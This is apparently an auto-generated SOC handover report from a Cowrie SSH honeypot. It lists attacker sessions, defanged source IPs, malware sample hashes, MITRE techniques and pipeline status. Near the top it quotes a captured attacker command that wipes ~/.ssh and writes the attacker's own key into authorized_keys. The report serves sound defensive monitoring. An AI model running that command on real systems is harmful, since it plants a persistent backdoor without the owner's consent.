| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:40:20` | `cowrie.session.connect` |
| `2026-06-04 12:40:20` | `cowrie.client.version` |
| `2026-06-04 12:40:20` | `cowrie.client.kex` |
| `2026-06-04 12:40:20` | `cowrie.login.success` |
| `2026-06-04 12:40:20` | `cowrie.session.params` |
| `2026-06-04 12:40:20` | `cowrie.command.input` |
| `2026-06-04 12:40:20` | `cowrie.command.failed` |
| `2026-06-04 12:40:20` | `cowrie.log.closed` |
| `2026-06-04 12:40:21` | `cowrie.session.params` |
| `2026-06-04 12:40:21` | `cowrie.command.input` |
| `2026-06-04 12:40:21` | `cowrie.session.file_download` |
| `2026-06-04 12:40:21` | `cowrie.log.closed` |
| `2026-06-04 12:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0eda2eef6e8

| Field | Detail |
|---|---|
| **Source IP** | `43.173.249[.]11` |
| **First Seen** | 2026-06-04 12:40 |
| **Last Seen** | 2026-06-04 12:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 12:40:22` | `cowrie.session.connect` |
| `2026-06-04 12:40:22` | `cowrie.client.version` |
| `2026-06-04 12:40:22` | `cowrie.client.kex` |
| `2026-06-04 12:40:23` | `cowrie.login.success` |
| `2026-06-04 12:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.173.249[.]11` to AbuseIPDB if not already reported
- [ ] Block `43.173.249[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.102.26[.]14` | **29** | 2026-06-04 10:11 | 2026-06-04 11:25 | 1m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.66.156[.]214` | **29** | 2026-06-04 10:26 | 2026-06-04 12:51 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `43.173.249[.]11` | **23** | 2026-06-04 11:59 | 2026-06-04 12:49 | 0m | 22 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `194.164.59[.]59` | **20** | 2026-06-04 12:12 | 2026-06-04 12:34 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.143.12[.]163` | **19** | 2026-06-04 10:01 | 2026-06-04 10:42 | 0m | 19 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `89.47.53[.]19` | **4** | 2026-06-04 12:17 | 2026-06-04 12:32 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `3.18.101[.]236` | **3** | 2026-06-04 12:20 | 2026-06-04 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.233.206[.]154` | **2** | 2026-06-04 12:39 | 2026-06-04 12:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.98.166[.]209` | **2** | 2026-06-04 11:49 | 2026-06-04 11:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.54[.]66` | 1 | 2026-06-04 11:52 | 2026-06-04 11:52 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.211.125[.]105` | 1 | 2026-06-04 10:51 | 2026-06-04 10:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.104.53[.]23` | 1 | 2026-06-04 11:33 | 2026-06-04 11:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.119.84[.]196` | 1 | 2026-06-04 10:16 | 2026-06-04 10:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]43` | 1 | 2026-06-04 10:35 | 2026-06-04 10:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-06-04 10:05 | 2026-06-04 10:05 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.207.115[.]249` | 1 | 2026-06-04 11:03 | 2026-06-04 11:03 | 9s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.172[.]43` | US | Censys, Inc. | **100** ⚠️ | 49 |
| `78.128.114[.]118` | BG | Tamatiya EOOD | **100** ⚠️ | 50 |
| `103.143.12[.]163` | ID | IPXO | **100** ⚠️ | 0 |
| `43.173.249[.]11` | TH | ACEVILLE PTE.LTD. | **100** ⚠️ | 22 |
| `103.233.206[.]154` | MM | Room (1), Building (7), Myanmar ICT Park, Hlaing Township, | **100** ⚠️ | 50 |
| `45.66.156[.]214` | US | Enzu cloud and colocation services | **100** ⚠️ | 1 |
| `103.146.202[.]84` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `101.126.54[.]66` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `59.27.249[.]238` | KR | Korea Telecom | **100** ⚠️ | 28 |
| `45.119.84[.]196` | VN | Long Van System Solution JSC | **100** ⚠️ | 24 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 99 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 64 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 31 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 31 |

---

## 🔕 False Positive Summary (40 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 11 below threshold 25 | 32 |
| AbuseIPDB score 15 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 242 cases |
| Tool 34  | Credential Extractor        | ✅ 163 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 8 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 40 filtered (16.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 64 priority case(s) shown individually · 16 recon entry/entries in table (9 group(s) consolidating 131 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-04T12:52:27Z_
